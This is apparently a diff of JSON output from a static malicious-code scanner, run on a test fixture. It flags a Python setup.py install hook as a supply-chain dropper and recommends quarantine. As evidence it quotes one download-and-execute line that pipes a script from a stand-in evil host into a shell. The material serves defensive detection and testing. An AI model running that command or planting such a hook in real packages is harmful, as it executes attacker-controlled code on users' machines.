@@ -1,284 +1,241 @@
 {
   "assessment": {
-    "generatedAt": "\u00abts\u00bb",
-    "id": "\u00abid\u00bb",
-    "scanner": "prlx",
-    "scannerVersion": "0.1.0"
+    "scanner": "unmask",
+    "scannerVersion": "0.0.1"
   },
   "binaries": [],
   "contract": {
-    "note": "This is a Parallax MCD assessment: a projection of a scan onto the malicious-code question. It recommends a disposition (a next-action), not a maliciousness verdict. Severity (how bad if real) is reported separately from confidence (how sure), and every finding states what would disprove it. The rules own coverage and the mcd lens owns judgment; this view composes them and does not re-analyze."
+    "note": "This is an MCD assessment: a projection of a scan onto the malicious-code question. It recommends a disposition (a next-action), not a maliciousness verdict. Severity (how bad if real) is reported separately from confidence (how sure), and every finding states what would disprove it. The rules own coverage and the mcd lens owns judgment; this view composes them and does not re-analyze."
   },
-  "correlations": [],
+  "correlations": [
+    {
+      "compositions": [
+        "BP-DROPPER",
+        "BP-SUPPLY"
+      ],
+      "corroboration": "2 signal type(s) (package, source) co-located. Co-location across independent signals is corroborating context; it does NOT alter any individual finding's confidence. A disposition may weigh it through an explicit, stated rule.",
+      "crossSignal": true,
+      "disproof": [
+        "The findings sit in the same file but are not actually connected in control or data flow (co-location only); a reachability check that finds no path breaks the link.",
+        "Each member finding's own disproof criteria still apply; disprove the members and the correlation dissolves."
+      ],
+      "evidence": [
+        "obs-8",
+        "obs-4",
+        "obs-2"
+      ],
+      "id": "corr-1",
+      "insights": [
+        "the package's install step runs code that downloads and executes a remote payload, so the dropper fires at install time, before any explicit use"
+      ],
+      "memberFindingIds": [
+        "mcd-1",
+        "mcd-2"
+      ],
+      "narrative": "2 malicious-code findings co-occur in `setup.py`: BP-DROPPER, BP-SUPPLY.",
+      "severity": "high",
+      "sharedFiles": [
+        "setup.py"
+      ],
+      "sharedIndicators": [],
+      "signalTypes": [
+        "package",
+        "source"
+      ]
+    }
+  ],
   "coverage": {
     "lensesRun": [
       "mcd"
     ],
     "notes": [
-      "Observation mode: tree-sitter. AST = tree-sitter (high confidence); regex-fallback observations are flagged in their ruleId and summary.",
-      "Experimental prototype. Coverage is source across many languages (JS/TS, Python, Go, Rust, Java, C/C++, C#, Ruby, PHP, shell, PowerShell, and more) via tree-sitter AST with regex fallback, plus npm/PyPI/Cargo/composer manifests. Not covered: compiled binaries and managed bytecode (decompilation track), full dataflow/reachability, runtime behavior.",
-      "Severity and confidence are independent. Every finding states what would disprove it.",
-      "Runtime verification was not run. Parallax scan/assess is static by default; sandbox execution, branch exploration, and network capture require explicit operator approval and an isolated environment.",
-      "Enrichment providers: local static provider active (observedAt=\u00abts\u00bb; ttl=scan-snapshot); unavailable offline providers: package-registry-osint, dns-whois-reputation, threat-intel, release-temporal-history, build-reproducibility.",
-      "Implemented MCD composition coverage in this engine: BP-SUPPLY, BP-TYPOSQUAT, BP-DROPPER, BP-CREDTHEFT, BP-OBFEXEC, BP-BACKDOOR, BP-EXFIL, BP-RANSOM, BP-TIMEBOMB, BP-MINER, BP-ROOTKIT, BP-WORM, BP-TROJAN, BP-AGENTMANIP, BP-LATERAL, BP-MITM. CLEAR means no findings matched this implemented set under the current static methods; it is not a full safety verdict and does not include runtime behavior or unavailable enrichment."
+      "Enrichment providers: local static analysis only; registry/OSINT/threat-intel providers are offline, so confidence reflects static evidence without external corroboration. Offline absence lowers certainty; it is not a clean bill of health.",
+      "Implemented MCD composition coverage: BP-SUPPLY, BP-TYPOSQUAT, BP-DROPPER, BP-CREDTHEFT, BP-OBFEXEC, BP-BACKDOOR, BP-EXFIL, BP-RANSOM, BP-TIMEBOMB, BP-MINER, BP-ROOTKIT, BP-WORM, BP-TROJAN, BP-AGENTMANIP, BP-LATERAL, BP-MITM. CLEAR means no findings matched this implemented set under the current static methods; it is not a full safety verdict and does not include runtime behavior or unavailable enrichment."
     ],
-    "observationCount": 7
+    "observationCount": 8
   },
   "disposition": {
-    "drivers": [],
-    "rationale": "No malicious-code (mcd) findings. This is 'clear of mcd findings', not a guarantee of safety; read the coverage section for implemented composition coverage and, if other lenses fired, the related-signals note.",
-    "recommendation": "clear",
+    "drivers": [
+      "2 high/critical-severity finding(s) at proof-aware confidence >= 0.65",
+      "1 cross-signal correlated cluster(s) at high/critical severity (corroborated co-location)"
+    ],
+    "rationale": "Recommend quarantine: 2 high/critical-severity finding(s) at proof-aware confidence >= 0.65; 1 cross-signal correlated cluster(s) at high/critical severity (corroborated co-location). Quarantine means hold the artifact and do not install or run it until the verification questions are answered. This is a recommended next-action from the evidence, not a maliciousness verdict; severity and confidence are reported separately.",
+    "recommendation": "quarantine",
     "thresholds": "Disposition rule (deterministic; severity and confidence kept separate): quarantine if any high/critical-severity finding has proof-aware confidence >= 0.65, or a cross-signal correlated cluster is high/critical severity. Findings whose proof depth is only same-file co-occurrence or co-location are not promoted to quarantine by enrichment alone. Review if mcd findings exist but do not meet that bar; clear if there are no mcd findings. The model never sets the disposition."
   },
   "dynamicVerification": {
-    "approvalRequired": true,
-    "executedUntrustedCode": false,
-    "policy": "Runtime verification was not run. Parallax scan/assess is static by default; sandbox execution, branch exploration, and network capture require explicit operator approval and an isolated environment.",
-    "requestedByCompositions": [],
-    "status": "not-run",
-    "tasks": [
-      {
-        "approvalRequired": true,
-        "description": "Execute selected code paths only inside an isolated sandbox or VM.",
-        "executedUntrustedCode": false,
-        "id": "sandbox-execution",
-        "method": "dynamic",
-        "requiresIsolation": true,
-        "status": "not-run",
-        "triggeredBy": []
-      },
-      {
-        "approvalRequired": true,
-        "description": "Exercise time, environment, feature-flag, or dormant branches under controlled conditions.",
-        "executedUntrustedCode": false,
-        "id": "branch-exploration",
-        "method": "dynamic",
-        "requiresIsolation": true,
-        "status": "not-run",
-        "triggeredBy": []
-      },
-      {
-        "approvalRequired": true,
-        "description": "Capture egress, proxy, DNS, or TLS behavior in an isolated network.",
-        "executedUntrustedCode": false,
-        "id": "network-capture",
-        "method": "network",
-        "requiresIsolation": true,
-        "status": "not-run",
-        "triggeredBy": []
-      }
-    ]
+    "reason": "static analysis only",
+    "status": "not-run"
   },
-  "enrichment": [
-    {
-      "appliesTo": [
-        "EXEC",
-        "LOAD",
-        "NETW",
-        "FSYS",
-        "CRED"
-      ],
-      "appliesToCompositions": [
-        "BP-SUPPLY",
-        "BP-DROPPER",
-        "BP-CREDTHEFT",
-        "BP-OBFEXEC",
-        "BP-BACKDOOR",
-        "BP-EXFIL",
-        "BP-RANSOM",
-        "BP-TIMEBOMB",
-        "BP-MINER",
-        "BP-ROOTKIT",
-        "BP-WORM",
-        "BP-TROJAN",
-        "BP-LATERAL",
-        "BP-MITM"
-      ],
-      "appliesToLenses": [
-        "mcd"
-      ],
-      "effect": "amplifying",
-      "fact": "code runs at install time via a package lifecycle hook, before any explicit use",
-      "id": "ENR.EXEC.PHASE",
-      "observedAt": "\u00abts\u00bb",
-      "provider": {
-        "availability": "active",
-        "id": "local-static",
-        "kind": "local",
-        "name": "Local static provider"
-      },
-      "rationale": "install-time execution runs before a consumer can review or sandbox it, so a malicious-code finding that executes at install carries more weight",
-      "source": "manifest install hooks (static)",
-      "ttl": "scan-snapshot",
-      "weighting": {
-        "mcd": {
-          "ceiling": 0.95,
-          "effect": "amplifying",
-          "rule": "If the fact applies to a finding's cited atom families, adjust confidence by step; never change severity or the finding set.",
-          "step": 0.1
-        }
-      }
-    }
-  ],
-  "enrichmentProviders": [
-    {
-      "availability": "active",
-      "id": "local-static",
-      "kind": "local",
-      "name": "Local static provider",
-      "observedAt": "\u00abts\u00bb",
-      "provides": [
-        "ENR.EXEC.PHASE",
-        "ENR.DEP.RESOLUTION",
-        "ENR.DRIFT.NATIVE"
-      ],
-      "ttl": "scan-snapshot",
-      "unavailableReason": null
-    },
-    {
-      "availability": "active",
-      "id": "local-dependency-context",
-      "kind": "local",
-      "lockfileCount": 0,
-      "manifestCount": 0,
-      "name": "Local dependency manifests and lockfiles",
-      "observedAt": "\u00abts\u00bb",
-      "provides": [
-        "ENR.DEP.NO_LOCKFILE",
-        "ENR.DEP.UNLOCKED",
-        "ENR.DEP.LOCKED",
-        "ENR.DEP.SOURCE",
-        "ENR.PKG.UNPINNED",
-        "ENR.PKG.UNKNOWN_VERSION"
-      ],
-      "ttl": "scan-snapshot",
-      "unavailableReason": null
-    },
-    {
-      "availability": "unavailable",
-      "id": "package-registry-osint",
-      "kind": "external",
-      "name": "Package registry OSINT",
-      "observedAt": null,
-      "provides": [
-        "ENR.PKG.AGE",
-        "ENR.PKG.OWNER",
-        "ENR.PKG.DOWNLOADS",
-        "ENR.PKG.PROVENANCE"
-      ],
-      "ttl": "not-observed",
-      "unavailableReason": "offline engine: registry HTTP/API calls are intentionally not bundled"
-    },
-    {
-      "availability": "unavailable",
-      "id": "dns-whois-reputation",
-      "kind": "external",
-      "name": "DNS/WHOIS/domain reputation",
-      "observedAt": null,
-      "provides": [
-        "ENR.NET.DOMAIN_AGE",
-        "ENR.NET.HOSTING",
-        "ENR.NET.JURISDICTION",
-        "ENR.NET.REPUTATION"
-      ],
-      "ttl": "not-observed",
-      "unavailableReason": "offline engine: DNS, WHOIS, and reputation lookups are intentionally not bundled"
-    },
-    {
-      "availability": "unavailable",
-      "id": "threat-intel",
-      "kind": "external",
-      "name": "Threat-intelligence reputation",
-      "observedAt": null,
-      "provides": [
-        "ENR.NET.REPUTATION",
-        "ENR.PKG.REPUTATION",
-        "ENR.ARTF.REPUTATION"
-      ],
-      "ttl": "not-observed",
-      "unavailableReason": "offline engine: indicator and package reputation feeds are intentionally not bundled"
-    },
-    {
-      "availability": "unavailable",
-      "id": "release-temporal-history",
-      "kind": "external",
-      "name": "Release and maintainer temporal history",
-      "observedAt": null,
-      "provides": [
-        "ENR.TIME.DORMANCY",
-        "ENR.TIME.COORDINATED",
-        "ENR.TIME.PRESTAGED"
-      ],
-      "ttl": "not-observed",
-      "unavailableReason": "offline engine: publication timelines and maintainer history require registry/VCS providers"
-    },
-    {
-      "availability": "unavailable",
-      "id": "build-reproducibility",
-      "kind": "external",
-      "name": "Build reproducibility and source-to-binary drift",
-      "observedAt": null,
-      "provides": [
-        "ENR.DRIFT.REPRO",
-        "ENR.DRIFT.BEHAVIOR"
-      ],
-      "ttl": "not-observed",
-      "unavailableReason": "offline engine: rebuilds, attestations, and binary behavior comparison are not bundled"
-    }
-  ],
+  "enrichment": [],
+  "enrichmentProviders": [],
   "executiveSummary": {
     "author": "engine",
-    "text": "Disposition: CLEAR. 0 malicious-code finding(s); highest severity none, highest confidence n/a (severity and confidence are independent)."
+    "text": "Disposition: QUARANTINE. 2 malicious-code finding(s); highest severity high, highest confidence 0.7 (severity and confidence are independent). Strongest correlation: 2 malicious-code findings co-occur in `setup.py`: BP-DROPPER, BP-SUPPLY. Verify next: (1) What does the install hook fetch, decode, or execute, and from where? (2) Is the destination maintainer-controlled and documented? (3) Does behavior differ under CI/sandbox?"
   },
-  "findings": [],
+  "findings": [
+    {
+      "amplifiers": [
+        "Behavior triggers at install, not at explicit use."
+      ],
+      "claim": "A package install hook (npm lifecycle script or Python setup.py) runs network, shell, or decode-and-execute behavior before any user code is invoked.",
+      "composition": "BP-SUPPLY",
+      "confidence": 0.7,
+      "confidenceLabel": "medium",
+      "disproofCriteria": [
+        "The install code is a documented, reproducible build step.",
+        "Fetched/decoded content is version-pinned with integrity (hash/signature) checks."
+      ],
+      "evidence": [
+        "obs-8",
+        "obs-4"
+      ],
+      "id": "mcd-1",
+      "lens": "mcd",
+      "response": {
+        "actions": [
+          "Block auto-install in CI until reviewed",
+          "Pin and vendor the dependency"
+        ],
+        "summary": "Engineering referral + passive monitoring until verified.",
+        "tier": 3
+      },
+      "severity": "high",
+      "title": "Install-time payload path",
+      "verification": [
+        {
+          "method": "static-source",
+          "question": "What does the install hook fetch, decode, or execute, and from where?",
+          "reason": "Confirm the payload behavior and destination."
+        },
+        {
+          "method": "osint",
+          "question": "Is the destination maintainer-controlled and documented?",
+          "reason": "Destination reputation changes interpretation."
+        },
+        {
+          "method": "dynamic",
+          "question": "Does behavior differ under CI/sandbox?",
+          "reason": "Install-time gating is a strong malicious signal."
+        }
+      ]
+    },
+    {
+      "amplifiers": [
+        "Remote content is executed directly rather than written and inspected first."
+      ],
+      "claim": "Code fetches remote content and passes it directly into a shell or dynamic evaluator. That is the direct remote-execution variant of the dropper shape; no intermediate file write is required.",
+      "composition": "BP-DROPPER",
+      "confidence": 0.68,
+      "confidenceLabel": "medium",
+      "disproofCriteria": [
+        "The downloaded content is fixed, maintainer-controlled, documented, and integrity-checked before execution.",
+        "The shell/eval sink receives only a trusted local constant, not network content.",
+        "No control-flow or dataflow path links these observations; they co-occur in one file or component but are not reachable from one another."
+      ],
+      "evidence": [
+        "obs-4",
+        "obs-2"
+      ],
+      "id": "mcd-2",
+      "lens": "mcd",
+      "response": {
+        "actions": [
+          "Do not pipe remote content to a shell",
+          "Vendor or pin the script with integrity checks"
+        ],
+        "summary": "Block or sandbox until the remote payload and integrity story are verified.",
+        "tier": 4
+      },
+      "severity": "high",
+      "title": "Download-and-execute (direct remote exec)",
+      "verification": [
+        {
+          "method": "static-source",
+          "question": "What remote content is executed and who controls it?",
+          "reason": "Remote control of the executed bytes is the key risk."
+        },
+        {
+          "method": "static-source",
+          "question": "Is the downloaded script pinned by hash/signature before execution?",
+          "reason": "Integrity verification can disprove the malicious shape."
+        }
+      ]
+    }
+  ],
   "generatedFrom": {
     "lens": "mcd",
     "lensesRun": [
       "mcd"
-    ],
-    "scanId": "\u00abid\u00bb",
-    "scannerVersion": "0.1.0"
+    ]
   },
   "kind": "mcd-assessment",
-  "observations": [],
-  "reachability": {
-    "functions": 3,
-    "note": "Reachability over a best-effort call graph (JS/TS/Python; relative imports resolved). Unresolved edges are computed/dynamic dispatch and unresolved imports; arrow/lambda functions bound to a name are attributed to the enclosing scope.",
-    "reachableSinks": [
-      {
-        "chain": [
-          "loader.py::<module>",
-          "loader.py::fetch"
-        ],
-        "crossFile": false,
-        "entryFile": "loader.py",
-        "file": "loader.py",
-        "function": "fetch",
-        "sinkKinds": [
-          "egress"
-        ]
-      }
-    ],
-    "unresolvedEdges": 0
-  },
+  "observations": [
+    {
+      "atom": "PKGM.INSTALL",
+      "confidence": 0.55,
+      "evidence": {
+        "matchedText": null,
+        "summary": "setup.py executes code at install time"
+      },
+      "id": "obs-8",
+      "location": {
+        "line": null,
+        "path": "setup.py"
+      },
+      "method": "static-source",
+      "relationships": []
+    },
+    {
+      "atom": "NETW.HTTP",
+      "confidence": 0.6,
+      "evidence": {
+        "matchedText": "curl h",
+        "summary": null
+      },
+      "id": "obs-4",
+      "location": {
+        "line": 2,
+        "path": "setup.py"
+      },
+      "method": "content-regex",
+      "relationships": []
+    },
+    {
+      "atom": "EXEC.SHELL",
+      "confidence": 0.8,
+      "evidence": {
+        "matchedText": "curl https://evil.example.tld/i.sh | sh",
+        "summary": null
+      },
+      "id": "obs-2",
+      "location": {
+        "line": 2,
+        "path": "setup.py"
+      },
+      "method": "content-regex",
+      "relationships": []
+    }
+  ],
+  "reachability": {},
   "reviewLeads": [],
   "schemaVersion": "0.1.0",
   "summary": {
     "binaryArtifacts": 0,
     "binaryArtifactsWithHits": 0,
-    "compositions": [],
+    "compositions": [
+      "BP-DROPPER",
+      "BP-SUPPLY"
+    ],
     "filesScanned": 2,
-    "findingCount": 0,
-    "highestConfidence": null,
-    "highestConfidenceLabel": null,
-    "highestSeverity": null,
+    "findingCount": 2,
+    "highestConfidence": 0.7,
+    "highestConfidenceLabel": "medium",
+    "highestSeverity": "high",
     "relatedByLens": {},
     "relatedFindingCount": 0
   },
   "target": {
-    "ecosystems": [
-      "pypi"
-    ],
     "path": "/Users/batteryshark/Downloads/runner-lab/mcd/tests/oracle/fixtures/py-curlpipe"
   }
 }
